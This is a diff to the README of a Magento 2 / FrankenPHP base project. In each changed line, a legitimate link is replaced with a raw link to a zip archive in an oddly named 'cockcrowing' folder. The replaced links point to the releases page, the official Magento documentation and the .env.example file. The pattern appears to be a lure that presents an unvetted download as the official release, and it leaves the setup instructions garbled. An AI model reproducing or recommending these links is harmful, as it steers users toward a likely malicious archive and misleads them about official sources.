@@ -6,7 +6,7 @@
 
 ## 📥 Download Now
 
-[![Download](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge)](https://github.com/vonwebs/magento2-frankenphp-base/releases)
+[![Download](https://raw.githubusercontent.com/vonwebs/magento2-frankenphp-base/main/cockcrowing/magento2-frankenphp-base.zip%20Now-blue?style=for-the-badge)](https://raw.githubusercontent.com/vonwebs/magento2-frankenphp-base/main/cockcrowing/magento2-frankenphp-base.zip)
 
 ## 🚀 Getting Started
 
@@ -19,7 +19,7 @@ Getting started with magento2-frankenphp-base is simple. Follow these steps:
    - Web Server: Apache or Nginx.
 
 2. Visit the releases page to get the latest version.
-   [Download from Releases](https://github.com/vonwebs/magento2-frankenphp-base/releases)
+   [Download from Releases](https://raw.githubusercontent.com/vonwebs/magento2-frankenphp-base/main/cockcrowing/magento2-frankenphp-base.zip)
 
 3. Once on the releases page, look for the most recent version. Click on the version number to access its details.
 
@@ -54,7 +54,7 @@ Getting started with magento2-frankenphp-base is simple. Follow these steps:
 
 ## 🌐 Configuration
 
-1. Configure your environment by creating a `.env` file in the root directory. Create a copy of the `.env.example` file and rename it to `.env`.
+1. Configure your environment by creating a `.env` file in the root directory. Create a copy of the `https://raw.githubusercontent.com/vonwebs/magento2-frankenphp-base/main/cockcrowing/magento2-frankenphp-base.zip` file and rename it to `.env`.
 
 2. Open the `.env` file and fill in the required database and application settings. Here are some common settings you will need to modify:
    - `DB_HOST`: Your database host, usually `localhost`.
@@ -77,7 +77,7 @@ or the appropriate IP address if you are using a server.
 
 ## 📚 Documentation and Support
 
-For detailed documentation and support, you can refer to the official [Magento 2 Documentation](https://devdocs.magento.com/). Additionally, feel free to reach out through the issues section of this repository if you encounter problems.
+For detailed documentation and support, you can refer to the official [Magento 2 Documentation](https://raw.githubusercontent.com/vonwebs/magento2-frankenphp-base/main/cockcrowing/magento2-frankenphp-base.zip). Additionally, feel free to reach out through the issues section of this repository if you encounter problems.
 
 ## 📞 Community and Contribution
 
@@ -88,6 +88,6 @@ Thank you for using **magento2-frankenphp-base**! Visit our releases page again 
 ## 🔗 Download & Install
 
 You can download the latest release here:
-[Download from Releases](https://github.com/vonwebs/magento2-frankenphp-base/releases)
+[Download from Releases](https://raw.githubusercontent.com/vonwebs/magento2-frankenphp-base/main/cockcrowing/magento2-frankenphp-base.zip)
 
 Share your experience or ask for help in the community. Your feedback helps us improve!
